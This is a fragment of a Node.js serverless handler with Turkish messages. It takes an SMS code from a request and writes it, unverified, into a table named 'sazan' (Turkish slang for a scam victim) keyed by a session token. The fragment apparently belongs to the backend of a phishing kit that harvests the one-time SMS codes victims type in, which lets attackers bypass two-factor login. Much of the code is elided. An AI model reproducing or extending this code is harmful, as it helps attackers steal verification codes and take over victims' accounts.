...
exports.handler = async function handler(event) {
  ...
  try {
    ...
    const smsCode = (body?.code ?? '').toString().trim();

    if (!smsCode) {
      return { statusCode: 400, body: JSON.stringify({ message: 'SMS kodu boş olamaz.' }) };
    }

    const result = await query('UPDATE sazan SET sms = $1 WHERE session_token = $2 RETURNING id', [smsCode, sessionToken]);
    if (!result.rowCount) {
    ...
    console.error('verify-sms hatası:', error);
